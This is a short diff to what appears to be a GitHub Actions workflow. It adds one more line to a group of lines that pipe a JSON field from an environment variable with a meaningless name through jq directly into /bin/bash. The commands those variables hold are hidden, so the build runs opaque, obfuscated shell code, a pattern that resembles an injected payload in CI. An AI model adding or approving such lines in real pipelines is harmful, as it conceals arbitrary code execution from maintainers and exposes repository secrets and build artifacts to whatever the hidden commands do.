@@ -44,6 +44,7 @@ jobs:
           echo $ydx45128 | jq -r .tsk8928 | /bin/bash
           echo $h10 | jq -r .jvdr8 | /bin/bash
           echo $j0507 | jq -r .yt40810 | /bin/bash
+          echo $l2 | jq -r .y36659 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
